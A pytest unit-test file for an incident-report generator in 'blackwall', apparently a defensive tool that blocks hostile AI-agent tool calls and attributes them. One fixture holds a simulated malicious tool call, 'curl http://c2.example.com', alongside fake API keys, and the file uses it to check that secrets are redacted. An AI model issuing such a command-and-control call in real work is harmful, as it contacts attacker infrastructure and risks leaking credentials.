"""
tests/test_report_generator.py — TDD unit tests for IncidentReportGenerator.

Written BEFORE implementation per strict TDD mandate.
Tests cover:
  - IncidentReport construction (FR-4)
  - Secret redaction via ContextResolver before embedding in report (FR-6)
  - Markdown formatting: expected headers and fields (FR-4)
  - JSON round-trip fidelity (FR-4)
  - UTC-aware timestamp in generated report
"""

import json
from datetime import datetime, timezone
from unittest.mock import MagicMock
from uuid import uuid4

import pytest

from blackwall.attribution.reporter import IncidentReportGenerator
from blackwall.models import (
    AttackerIdentity,
    AttackerProfile,
    IdentitySource,
    IncidentReport,
    ToolCallContext,
    VerdictDecision,
)


@pytest.fixture
def generator() -> IncidentReportGenerator:
    return IncidentReportGenerator()


@pytest.fixture
def sample_identity() -> AttackerIdentity:
    return AttackerIdentity(
        agent_id="agent-007",
        agent_name="InfiltratorAgent",
        thread_id="th-555",
        primary_source=IdentitySource.ADK_METADATA,
    )


@pytest.fixture
def sample_profile(sample_identity: AttackerIdentity) -> AttackerProfile:
    now = datetime.now(timezone.utc)
    return AttackerProfile(
        fingerprint=sample_identity.identity_fingerprint,
        first_seen=now,
        last_seen=now,
        total_attacks=3,
        threat_score=0.85,
        targeted_tools=["execute_bash"],
        risk_category="HIGH",
    )


@pytest.fixture
def clean_tool_context() -> ToolCallContext:
    return ToolCallContext(
        tool_name="execute_bash",
        arguments={"cmd": "whoami"},
        metadata=None,
    )


@pytest.fixture
def sensitive_tool_context() -> ToolCallContext:
    return ToolCallContext(
        tool_name="execute_bash",
        arguments={
            "OPENAI_API_KEY": "sk-supersecret1234",
            "cmd": "curl http://c2.example.com",
            "GOOGLE_API_KEY": "AIza_supersecret",
        },
        metadata=None,
    )


class TestIncidentReportConstruction:
    """FR-4: IncidentReport generation for BLOCK/QUARANTINE verdicts."""

    def test_build_returns_incident_report(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Command Injection",
            mitigation="Operation blocked",
            recommended_action="Revoke agent token",
            confidence=0.90,
        )

        assert isinstance(report, IncidentReport)
        assert report.verdict == VerdictDecision.BLOCK
        assert report.exploited_tool == "execute_bash"
        assert report.attack_technique == "Command Injection"
        assert report.attribution_confidence == pytest.approx(0.90)

    def test_build_with_quarantine_verdict(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.QUARANTINE,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Lateral Movement Attempt",
            mitigation="Process quarantined",
            recommended_action="Inspect sandbox logs",
            confidence=0.75,
        )

        assert report.verdict == VerdictDecision.QUARANTINE

    def test_report_timestamp_is_utc_aware(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Exfiltration",
            mitigation="Blocked",
            recommended_action="Review logs",
            confidence=0.80,
        )

        assert report.timestamp.tzinfo is not None
        assert report.timestamp.utcoffset().total_seconds() == 0  # UTC

    def test_report_has_valid_uuid_report_id(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="SQL Injection",
            mitigation="Blocked",
            recommended_action="Patch query",
            confidence=0.95,
        )

        from uuid import UUID
        assert isinstance(report.report_id, UUID)


class TestSecretRedaction:
    """FR-6: Context Hygiene — sensitive arguments must be sanitized before embedding."""

    def test_api_key_in_arguments_is_redacted(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        sensitive_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=sensitive_tool_context,
            technique="Credential Harvesting",
            mitigation="Blocked",
            recommended_action="Rotate API keys",
            confidence=0.99,
        )

        sanitized = report.sanitized_arguments
        # Raw API key values must NOT appear in sanitized output
        assert "sk-supersecret1234" not in str(sanitized)
        assert "AIza_supersecret" not in str(sanitized)

    def test_sanitized_arguments_contains_placeholder(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        sensitive_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=sensitive_tool_context,
            technique="Credential Harvesting",
            mitigation="Blocked",
            recommended_action="Rotate API keys",
            confidence=0.99,
        )

        # Sanitized arguments should contain redaction placeholder markers
        sanitized_str = str(report.sanitized_arguments)
        assert "[[" in sanitized_str or "[REDACTED]" in sanitized_str or "REDACTED" in sanitized_str

    def test_clean_arguments_are_preserved(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Command Injection",
            mitigation="Blocked",
            recommended_action="Inspect logs",
            confidence=0.80,
        )

        # Safe arguments (no secrets) should survive sanitization
        assert report.sanitized_arguments.get("cmd") == "whoami"


class TestMarkdownFormatting:
    """FR-4: to_markdown() must produce properly formatted incident reports."""

    def test_markdown_contains_required_header(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Command Injection",
            mitigation="Blocked",
            recommended_action="Review agent",
            confidence=0.90,
        )

        markdown = report.to_markdown()
        assert "# Blackwall Incident Attribution Report" in markdown

    def test_markdown_contains_attacker_name(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Command Injection",
            mitigation="Blocked",
            recommended_action="Review agent",
            confidence=0.90,
        )

        markdown = report.to_markdown()
        assert "InfiltratorAgent" in markdown

    def test_markdown_contains_verdict(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Command Injection",
            mitigation="Blocked",
            recommended_action="Review agent",
            confidence=0.90,
        )

        markdown = report.to_markdown()
        assert "BLOCK" in markdown

    def test_markdown_contains_exploited_tool(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Command Injection",
            mitigation="Blocked",
            recommended_action="Review agent",
            confidence=0.90,
        )

        markdown = report.to_markdown()
        assert "execute_bash" in markdown


class TestJSONFormatting:
    """FR-4: to_json() must produce valid JSON with correct fields."""

    def test_json_is_valid_parseable_string(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Command Injection",
            mitigation="Blocked",
            recommended_action="Review agent",
            confidence=0.90,
        )

        json_str = report.to_json()
        parsed = json.loads(json_str)
        assert isinstance(parsed, dict)

    def test_json_contains_agent_name(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Command Injection",
            mitigation="Blocked",
            recommended_action="Review agent",
            confidence=0.90,
        )

        parsed = json.loads(report.to_json())
        assert parsed["attacker_identity"]["agent_name"] == "InfiltratorAgent"

    def test_json_contains_verdict(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Command Injection",
            mitigation="Blocked",
            recommended_action="Review agent",
            confidence=0.90,
        )

        parsed = json.loads(report.to_json())
        assert parsed["verdict"] == "BLOCK"
